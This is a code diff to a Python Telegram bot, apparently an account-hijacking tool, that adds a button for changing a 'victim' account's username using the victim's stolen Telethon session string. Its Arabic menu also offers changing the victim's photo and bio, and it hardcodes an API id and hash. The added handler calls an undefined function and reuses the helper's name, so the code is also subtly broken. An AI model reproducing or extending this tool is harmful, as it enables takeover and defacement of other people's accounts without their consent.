@@ -15,6 +15,8 @@ from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
 import telethon;from telethon import functions
 from telethon.tl.types import ChannelParticipantsAdmins as cpa
 from telethon.tl.functions.account import UpdateProfileRequest
+
+from telethon.tl.functions.account import UpdateUsernameRequest
 import random
 
 
@@ -171,6 +173,17 @@ async def cu(strses):
   except Exception as e:
     return False
 
+
+async def change_username(termux_code, new_username):
+    async with tg(ses(termux_code), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+        try:
+            await X(UpdateUsernameRequest(username=new_username))
+            return True
+        except Exception as e:
+            print(e)
+            return False
+#kom be Rio
+
 async def usermsgs(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     i = ""
@@ -251,7 +264,9 @@ menu = '''
 
 "Z" ~ [ تغير صورة حساب الضحية ]
 
-"X" ~ [ تغير بايو حساب الضحية ] 
+"X" ~ [ تغير بايو حساب الضحية ]
+ 
+"O" ~ [ تغير يوزر حساب الضحية ] 
 '''
 mm = '''
 قم بلأنضمام الى قناة الخفاش @angthon
@@ -283,6 +298,7 @@ keyboard = [
     ],
     [
      Button.inline("X", data="X"),  # إضافة زر شفاف بحرف X
+     Button.inline("O", data="O"),  # إضافة زر شفاف بحرف O
      Button.url("المطور", "https://t.me/angthon")
     ]
 ]
@@ -853,3 +869,25 @@ async def users(event):
         new_bio_text = new_bio_msg.text
         await change_bio(strses.text, new_bio_text) 
         await event.reply(" غيرت البايو 🦇", buttons=keyboard)
+
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"O")))
+async def change_username(event):
+    async with bot.conversation(event.chat_id) as conv:
+        await conv.send_message("الرجاء إرسال الكود التيرمكس للضحية  ")
+        termux_code_msg = await conv.get_response()
+        termux_code = termux_code_msg.text
+
+        success = await check_termux_code(termux_code)
+
+        if success:
+            pass  # اذا جان رجع
+        else:
+            return await event.respond("تم إنهاء الجلسة من قبل الضحية.", buttons=keyboard)
+
+        await conv.send_message("الرجاء إدخال اليوزر الجديد")
+        new_username_msg = await conv.get_response()
+        new_username = new_username_msg.text
+
+        await change_username_function(termux_code, new_username)
+        await event.reply("تم تغيير اسم المستخدم بنجاح 🚀💀", buttons=keyboard)
+#هذه الاوامر فقط في سورس الخفاش 🦇
